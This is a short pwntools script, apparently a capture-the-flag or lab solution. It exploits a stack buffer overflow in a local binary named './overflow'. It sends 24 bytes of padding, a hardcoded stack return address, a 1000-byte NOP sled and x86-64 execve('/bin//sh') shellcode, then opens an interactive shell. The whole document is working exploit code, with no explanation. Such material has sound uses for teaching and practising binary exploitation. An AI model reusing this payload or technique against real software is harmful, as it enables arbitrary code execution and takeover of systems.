from pwn import *
p = process("./overflow")

junk = "A" * 24
ret = 0x7fffffffe128
nop = "\x90" * 1000
shellcode = "\x48\x31\xC0\x50\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"

p.sendline(junk + p64(ret + len(nop)/2) + nop + shellcode) 
# p.sendline(junk + p64(ret+8) + shellcode)

p.interactive()

# p.sendline(junk + p64(ret + len(nop)/2) + nop + shellcode)
